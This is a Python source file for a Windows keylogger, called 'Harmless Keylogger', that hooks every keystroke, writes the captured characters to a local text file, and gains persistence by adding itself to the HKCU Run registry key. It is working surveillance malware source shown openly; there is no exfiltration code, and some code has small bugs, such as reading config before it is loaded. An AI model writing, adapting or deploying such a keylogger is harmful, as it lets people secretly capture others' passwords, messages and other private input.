import keyboard
import win32api
import win32event
import winerror
import json
import os
from os.path import exists
import sys
from winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, DeleteValue, QueryValueEx

# File where the Characters get logged
file = 'myBook.txt'
# Buffer for characters
line_buffer = ''
# Buffer Size limit 
CHAR_LIMIT = 10
# Config File
CONFIG_FILE = 'keylogger-config.json'
# Name of The Logger (Be carefull changeing this may results in unremoveable registered autostart)
LOGGER_NAME = "Harmless Keylogger"
# File path
current_file_path = os.path.realpath(sys.argv[0])
# Directory path
dir_path = os.path.dirname(os.path.realpath(sys.argv[0]))
print(dir_path)

# Config Dict
config = {}

# Disallowing multiple instances
mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    if config["mode"] == "debug":
        print("Multiple instances are not allowed")
    exit(0)

# Read confgi from json file
def read_config():
    if exists(CONFIG_FILE) and not os.stat(CONFIG_FILE).st_size == 0:
        with open(CONFIG_FILE, "r") as read_file:
            global config
            config = json.load(read_file)
            return True
    else:
        return False

# Add to startup for persistence
def add_to_startup():
    global config
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)

    reg_value_prefix = 'CMD /k "cd ' + dir_path + ' && ' + 'python' + ' '
    reg_value_postfix = '"'

    reg_value = reg_value_prefix + '"' + current_file_path + reg_value_postfix

    try:
        SetValueEx(key2change, LOGGER_NAME, 0, REG_SZ, reg_value)
    except Exception as e:
        print(e)

# Remove from startup f
def remove_from_startup():
    key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)

    try:
        DeleteValue(key2change, LOGGER_NAME)  
    except Exception as e:
        print(e, ". Not critical if logger isn't applied to startup")

# Debug logger
def log_debug():
    global line_buffer
    print(line_buffer)
    line_buffer = ''
    return True

# Append file with pressed keys
def log_local():
    global line_buffer
    f = open(file, "a")
    f.write(line_buffer)
    f.close
    line_buffer = ''
    return True

# Log with configured mode
def log_it():
    global line_buffer, config
    if config["mode"] == "local":
        if len(line_buffer) >= CHAR_LIMIT:
            log_local()
    return True

def key_callback(event):
    global line_buffer

    # event key up 
    if event.event_type == 'up':
        return True
    
    # Debug Mode
    if config["mode"] == 'debug':
        line_buffer += event.name
        log_debug()
        return True

    # Key Represention
    if event.name == 'space':
        key_pressed = ' '
    elif event.name == 'enter':
        key_pressed = '\n'
    else:
        key_pressed = event.name
        if len(key_pressed) == 1:
            l = 1  # Just for place holder
        else:
            return True

    line_buffer += key_pressed
    
    log_it()
    return True  

def main(): 
    keyboard.hook(key_callback)
    # To Exit the Keylogger with safing the buffer (ctrl + tab + ende)
    keyboard.wait('ctrl+shift+e') 
    log_local()
    print("Keylogger stopped.")
    return

if __name__ == '__main__':
    # # Read the configurarion
    read_config()

    # # Debug mode Write single characters 
    if config["mode"] == 'debug':
        CHAR_LIMIT = 1

    # # Add to startup
    if config["auto-start"]:
        add_to_startup()
    else: 
        remove_from_startup()

    main()
